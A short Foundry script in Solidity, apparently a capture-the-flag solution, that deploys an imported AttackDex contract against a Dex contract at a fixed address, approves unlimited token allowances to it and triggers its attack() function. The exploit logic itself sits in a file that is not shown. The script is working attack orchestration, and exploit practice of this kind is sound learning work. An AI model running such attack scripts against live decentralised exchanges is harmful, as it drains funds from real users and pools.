// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {AttackDex} from "src/Dex/AttackDex.sol";
import {Dex, IERC20} from "src/Dex/Dex.sol";

contract DexScript is Script {
    function run() external {
        vm.startBroadcast(0x777dcCD91f7C62717DBa44db3504bDf47C75E2F1);

        Dex target = Dex(0x2788040F6086aF8e663E7eCEa1D620d03c28d8Bb);
        AttackDex attack = new AttackDex(address(target));
        IERC20 token1 = IERC20(target.token1());
        IERC20 token2 = IERC20(target.token2());
        token1.approve(address(attack), type(uint256).max);
        token2.approve(address(attack), type(uint256).max);

        attack.attack();

        vm.stopBroadcast();
    }
}
